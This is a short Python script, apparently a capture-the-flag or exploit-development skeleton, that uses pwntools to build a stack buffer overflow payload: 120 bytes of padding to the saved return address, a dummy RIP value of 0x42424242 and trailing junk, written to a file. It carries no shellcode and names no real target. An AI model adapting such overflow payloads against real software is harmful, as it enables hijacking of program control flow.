#!/usr/bin/python3
from pwn import *

payload = b'A' * 120           # offset to RIP
payload += p64(0x42424242)      # RIP
payload += b'C' * 170           # some more junk, because why not

f = open("payload.txt", "wb")
f.write(payload)
